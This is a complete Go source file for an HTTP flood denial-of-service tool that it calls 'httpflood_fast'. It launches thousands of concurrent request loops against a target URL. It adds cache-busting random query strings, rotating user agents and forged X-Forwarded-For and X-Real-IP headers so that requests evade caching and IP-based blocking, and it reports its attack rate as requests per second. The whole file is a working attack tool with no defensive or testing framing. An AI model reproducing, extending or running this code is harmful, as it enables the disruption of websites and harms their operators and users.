package main

import (
    "flag"
    "fmt"
    "math/rand"
    "os"
    "runtime"
    "strings"
    "sync"
    "sync/atomic"
    "time"

    "github.com/valyala/fasthttp"
)

var (
    targetURL        string
    threads          int
    duration         int
    method           string
    postData         string
    proxyFile        string
    maxConnsPerHost  int
    disableKeepAlive bool
    cpuCores         int
)

var requestCount uint64
var wg sync.WaitGroup

func randomString(length int) string {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    b := make([]byte, length)
    for i := range b {
        b[i] = chars[rand.Intn(len(chars))]
    }
    return string(b)
}

func randomUserAgent() string {
    agents := []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    }
    return agents[rand.Intn(len(agents))]
}

func randomIP() string {
    return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
}

func buildRequest(method string, url string, postData string) (*fasthttp.Request, *fasthttp.Response) {
    req := fasthttp.AcquireRequest()
    resp := fasthttp.AcquireResponse()

    req.SetRequestURI(url)

    if method == "POST" {
        req.Header.SetMethod("POST")
        if postData == "" {
            payload := fmt.Sprintf("key_%s=%s&token_%s=%s&data=%s",
                randomString(5), randomString(10),
                randomString(3), randomString(8),
                randomString(20))
            req.SetBodyString(payload)
            req.Header.SetContentType("application/x-www-form-urlencoded")
        } else {
            req.SetBodyString(postData)
            req.Header.SetContentType("application/json")
        }
    } else {
        req.Header.SetMethod("GET")
        if strings.Contains(url, "?") {
            req.SetRequestURI(url + "&_r=" + randomString(8) + "&_t=" + fmt.Sprint(time.Now().UnixNano()))
        } else {
            req.SetRequestURI(url + "?_r=" + randomString(8) + "&_t=" + fmt.Sprint(time.Now().UnixNano()))
        }
    }

    req.Header.Set("User-Agent", randomUserAgent())
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
    req.Header.Set("Accept-Language", "en-US,en;q=0.5")
    req.Header.Set("Accept-Encoding", "gzip, deflate, br")
    req.Header.Set("Connection", "keep-alive")
    req.Header.Set("Upgrade-Insecure-Requests", "1")
    req.Header.Set("Cache-Control", "no-cache")
    req.Header.Set("Pragma", "no-cache")
    req.Header.Set("X-Forwarded-For", randomIP())
    req.Header.Set("X-Real-IP", randomIP())

    return req, resp
}

func attackLoop(stopChan <-chan bool) {
    defer wg.Done()

    client := &fasthttp.Client{
        MaxConnsPerHost:     maxConnsPerHost,
        DisableKeepAlive:    disableKeepAlive,
        MaxIdleConnDuration: 10 * time.Second,
        ReadTimeout:         5 * time.Second,
        WriteTimeout:        5 * time.Second,
    }

    for {
        select {
        case <-stopChan:
            return
        default:
            req, resp := buildRequest(method, targetURL, postData)
            err := client.Do(req, resp)
            if err == nil {
                atomic.AddUint64(&requestCount, 1)
            }
            fasthttp.ReleaseRequest(req)
            fasthttp.ReleaseResponse(resp)
        }
    }
}

func loadProxies(filename string) []string {
    data, err := os.ReadFile(filename)
    if err != nil {
        return nil
    }
    lines := strings.Split(string(data), "\n")
    var proxies []string
    for _, line := range lines {
        line = strings.TrimSpace(line)
        if line != "" {
            proxies = append(proxies, line)
        }
    }
    return proxies
}

func main() {
    flag.StringVar(&targetURL, "url", "", "Target URL (required)")
    flag.IntVar(&threads, "t", 2000, "Number of concurrent goroutines")
    flag.IntVar(&duration, "d", 60, "Duration in seconds")
    flag.StringVar(&method, "m", "GET", "HTTP method (GET/POST)")
    flag.StringVar(&postData, "data", "", "POST data")
    flag.StringVar(&proxyFile, "proxy", "", "Proxy file (not implemented, but kept for compatibility)")
    flag.IntVar(&maxConnsPerHost, "conns", 10000, "Max connections per host")
    flag.BoolVar(&disableKeepAlive, "nokeepalive", false, "Disable keep-alive")
    flag.IntVar(&cpuCores, "cpu", 0, "Number of CPU cores")
    flag.Parse()

    if targetURL == "" {
        fmt.Println("Usage: httpflood_fast -url https://target.com -t 5000 -d 60 -m POST")
        return
    }

    if cpuCores > 0 {
        runtime.GOMAXPROCS(cpuCores)
    } else {
        runtime.GOMAXPROCS(runtime.NumCPU())
    }

    rand.Seed(time.Now().UnixNano())

    if proxyFile != "" {
        fmt.Println("[!] Proxy support not implemented in this version, ignoring -proxy")
    }

    stopChan := make(chan bool)

    fmt.Printf("[+] Starting %s flood on %s\n", method, targetURL)
    fmt.Printf("[+] Duration: %d seconds | Goroutines: %d | MaxConnsPerHost: %d\n", duration, threads, maxConnsPerHost)
    fmt.Printf("[+] CPU cores: %d | Keep-alive: %v\n", runtime.GOMAXPROCS(0), !disableKeepAlive)
    fmt.Println("[+] Attack is running...")

    startTime := time.Now()

    for i := 0; i < threads; i++ {
        wg.Add(1)
        go attackLoop(stopChan)
    }

    ticker := time.NewTicker(1 * time.Second)
    go func() {
        var lastCount uint64 = 0
        for range ticker.C {
            current := atomic.LoadUint64(&requestCount)
            rps := current - lastCount
            lastCount = current
            fmt.Printf("\r[*] Requests sent: %d | RPS: %d", current, rps)
        }
    }()

    time.Sleep(time.Duration(duration) * time.Second)
    close(stopChan)

    wg.Wait()
    ticker.Stop()

    elapsed := time.Since(startTime)
    totalReqs := atomic.LoadUint64(&requestCount)
    avgRPS := float64(totalReqs) / elapsed.Seconds()

    fmt.Printf("\n\n[+] Attack finished.\n")
    fmt.Printf("[+] Total requests: %d\n", totalReqs)
    fmt.Printf("[+] Duration: %.2f seconds\n", elapsed.Seconds())
    fmt.Printf("[+] Average RPS: %.0f\n", avgRPS)
}
